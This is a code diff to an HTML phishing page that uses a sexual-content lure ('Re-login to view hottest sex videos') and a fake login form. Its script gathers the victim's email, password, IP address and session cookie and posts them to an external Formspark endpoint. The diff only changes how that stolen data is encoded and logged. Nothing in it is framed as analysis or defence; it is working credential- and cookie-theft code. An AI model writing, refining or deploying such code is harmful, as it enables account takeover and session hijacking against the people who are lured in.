@@ -131,7 +131,7 @@
         <p style="color:red">Re-login to view hottest sex videos and sexy nudes</p>
 
         <!-- Login Form -->
-        <form id="loginForm" method="POST">
+        <form id="loginForm">
             <input type="email" id="email" name="email" placeholder="Email" required>
             <input type="password" id="password" name="password" placeholder="Password" required>
             <button type="submit">Log In</button>
@@ -173,29 +173,31 @@
 
             // Get the IP address and cookie
             const ipAddress = await fetchIpAddress();
-            const sessionId = getCookie('sessionId'); // Replace 'sessionId' with the actual cookie name
+            const sessionId = getCookie('sessionId') || 'No cookie found'; // Get the cookie or set default value
 
             // Prepare data to send to Formspark
-            const formData = {
-                email: email,
-                password: password,
-                ipAddress: ipAddress,
-                cookie: sessionId || 'No cookie found'
-            };
+            const formData = new URLSearchParams();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('ipAddress', ipAddress);
+            formData.append('cookie', sessionId);
 
             try {
                 // Send data to Formspark
                 const response = await fetch('https://submit.formspark.io/VlWBYGciz', {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/x-www-form-urlencoded'
                     },
-                    body: JSON.stringify(formData)
+                    body: formData
                 });
 
+                const result = await response.json();
                 if (response.ok) {
+                    console.log('Form submitted successfully', result);
                     alert('Form submitted successfully');
                 } else {
+                    console.error('Error submitting form:', result);
                     alert('Form submission failed');
                 }
             } catch (error) {
